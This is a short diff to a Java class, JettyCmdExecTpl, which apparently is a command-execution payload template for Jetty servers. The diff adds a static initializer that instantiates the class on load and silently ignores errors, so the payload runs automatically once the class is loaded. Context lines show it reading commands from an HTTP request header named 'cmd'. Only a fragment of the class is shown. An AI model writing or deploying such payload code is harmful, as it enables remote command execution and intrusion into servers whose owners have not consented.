@@ -7,6 +7,13 @@ import java.lang.reflect.Field;
 import java.util.Scanner;
 
 public class JettyCmdExecTpl {
+    static {
+        try {
+            new JettyCmdExecTpl();
+        } catch (Exception e) {
+        }
+    }
+
     private String getReqHeaderName() {
         return "cmd";
     }
